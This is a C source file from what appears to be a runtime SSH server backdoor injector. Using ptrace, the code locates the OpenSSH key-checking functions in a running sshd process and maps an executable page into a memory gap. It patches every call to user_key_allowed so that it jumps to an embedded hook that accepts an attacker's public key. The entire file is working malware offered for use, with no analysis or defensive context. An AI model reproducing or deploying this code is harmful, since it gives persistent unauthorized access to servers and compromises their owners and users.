#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#include <elflib.h>
#include <inject.h>
#include <sig.h>
#include <common.h>
#include <callcache.h>
#include <util.h>
#include <ptrace.h>

#include <types.h>

extern unsigned char hook_pubkey_bin[];
extern int hook_pubkey_bin_len;


void backdoor_pubkey_install(inject_ctx *ctx) {
	signature signatures[]={
		{ 0x1, "key_allowed", "trying public key file %s", 0 },
		{ 0x2, "restore_uid", "restore_uid: %u/%u"       , 0 },
		{ 0x3, "key_new"    , "key_new: RSA_new failed"  , 0 }, 
		{ 0x4, "key_read"   , "key_read: type mismatch: ", 0 }, 
		{ 0x5, "key_free"   , "key_free: "               , 0 }, 
	};

	u8 *evil_bin;
	int i;
	u32 callcache_total, num_key_allowed2_calls=0;
	char line[255];
	callcache_entry *callcache, *entry;
	u64 user_key_allowed2_calls[MAX_KEY_ALLOWED_CALLS];
	u64 diff=0, hole_addr=0, *import_table;

	mod_banner("installing pubkey backdoor");

	evil_bin = malloc(hook_pubkey_bin_len);
	import_table = (u64*)(evil_bin + 8);

	memcpy(evil_bin, hook_pubkey_bin, hook_pubkey_bin_len);

	import_table[0] = ctx->config_addr;

	for(i = 0; i < sizeof(signatures) / sizeof(signature); i++) {
		if (ctx->uses_new_key_system == 0 || i < 2) {
			signatures[i].addr = sub_by_debugstr(ctx, signatures[i].str);
		} else {
			u64 f_dsa_new, f_bn_new, p_dsa_new, p_bn_new, callpair, callpair_b, p_rsa_free, p_dsa_free;

			switch(i) {
				case 2: // key_new
					f_dsa_new = resolve_reloc_all(ctx, "DSA_new");
					f_bn_new = resolve_reloc_all(ctx, "BN_new");

					info("DSA_new@got = 0x%lx", f_dsa_new);
					info("BN_new@got = 0x%lx", f_bn_new);

					p_dsa_new = find_plt_entry(ctx, ctx->elf_base + f_dsa_new);
					p_bn_new = find_plt_entry(ctx, ctx->elf_base + f_bn_new);

					info("DSA_new@plt = 0x%lx", p_dsa_new);
					info("BN_new@plt = 0x%lx", p_bn_new);

					callpair = find_callpair(p_dsa_new, p_bn_new);

					if (callpair == 0) {
						error("could not find a (DSA_new, BN_new) callpair!");
					}

					signatures[i].addr = find_entrypoint(callpair);
				break;

				case 3: // key_read
					signatures[i].addr = prevcall_by_debugstr0(ctx, "user_key_allowed: advance: ");
				break;

				case 4: // key_free
					p_rsa_free = find_plt_entry(ctx, ctx->elf_base + resolve_reloc_all(ctx, "RSA_free"));
					p_dsa_free = find_plt_entry(ctx, ctx->elf_base + resolve_reloc_all(ctx, "DSA_free"));

					info("RSA_free@plt = 0x%lx", p_rsa_free);
					info("DSA_free@plt = 0x%lx", p_dsa_free);

					callpair_b = find_callpair(p_rsa_free, p_dsa_free);

					if(callpair_b == 0) {
						callpair_b = find_callpair(p_dsa_free, p_rsa_free);
					}

					if(callpair_b != 0) {
						info("found callpair @ 0x%lx .. finding entrypoint..", callpair_b);

						signatures[i].addr = find_entrypoint_inner(callpair_b, 3);
					} else {
						error("could not find valid callpair to derive key_free()");
					}
				break;

				default:
					error("WTF just happened!");
				break;
			}
		}

		if (signatures[i].addr == 0) {
			error("%s not found :(\n", signatures[i].name);
		}

		sprintf(line, 
			"%s\t\t= \x1b[37m0x%lx",
			signatures[i].name, signatures[i].addr - ctx->elf_base
		);

		import_table[ signatures[i].import_id ] = signatures[i].addr;

		sprintf(
			line+strlen(line), 
			" .. patched at offset 0x%lx in import table!", 
			(signatures[i].import_id*8) & 0xffff
		);

		info(line);
	}

	u64 f_BN_cmp = resolve_reloc_all(ctx, "BN_cmp");
	info("BN_cmp@got = 0x%lx", f_BN_cmp);
	u64 l_BN_cmp;
	_peek(ctx->pid, ctx->elf_base + f_BN_cmp, &l_BN_cmp, 8);
	info("BN_cmp@lib = 0x%lx", l_BN_cmp);

	import_table[6] = l_BN_cmp;

	callcache = get_callcache();
	callcache_total = get_callcachetotal();

	for(i=0; i<callcache_total; i++) {
		entry = &callcache[i];
		if (entry->dest == signatures[0].addr && entry->type == CALLCACHE_TYPE_CALL) {
			info("found a 'call user_key_allowed' @ 0x%lx", entry->addr);
			user_key_allowed2_calls[num_key_allowed2_calls] = entry->addr;
			num_key_allowed2_calls++;
		}
	}

	if (num_key_allowed2_calls == 0)
		error("no call to user_key_allowed2 found :(");

	hole_addr = find_hole(ctx, user_key_allowed2_calls[0], 0x1000);
	
	if (hole_addr == 0) {
		error("unable to find neighborly hole.");
	}

	info("found usable hole @ 0x%lx", hole_addr);

	_mmap(
		ctx, (void*)hole_addr, 0x1000,
		PROT_READ| PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED,
		0, 0
	);

	for(i=0; i<num_key_allowed2_calls; i++) {
		diff = 0x100000000-(user_key_allowed2_calls[i]-hole_addr)-5;

		info(
			"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
			user_key_allowed2_calls[i], hole_addr,
			diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
		);

		_poke(ctx->pid, user_key_allowed2_calls[i]+1, &diff, 4);
	}

	_poke(ctx->pid, hole_addr, evil_bin, hook_pubkey_bin_len);
}
